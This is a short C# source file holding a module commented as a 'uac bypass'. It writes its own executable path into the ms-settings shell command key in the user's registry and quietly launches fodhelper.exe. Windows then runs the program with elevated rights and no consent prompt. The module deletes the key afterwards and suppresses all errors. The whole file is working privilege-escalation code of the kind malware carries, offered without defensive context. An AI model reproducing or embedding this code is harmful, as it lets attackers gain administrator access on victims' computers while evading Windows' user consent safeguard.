using Microsoft.Win32;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Threading.Tasks;

public static class UAC
{
    public static void Start()
    { //uac bypass module
        try
        {

            string exePath = Process.GetCurrentProcess().MainModule.FileName;


            string regPath = @"Software\Classes\ms-settings\shell\open\command";


            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(regPath))
            {
                key.SetValue("", "\"" + exePath + "\"");
                key.SetValue("DelegateExecute", "");
            }


            Process.Start(new ProcessStartInfo
            {
                FileName = "fodhelper.exe",
                UseShellExecute = true,
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden
            });


            Thread.Sleep(2000);
            Registry.CurrentUser.DeleteSubKeyTree(regPath);
        }
        catch
        {

        }
    }
}
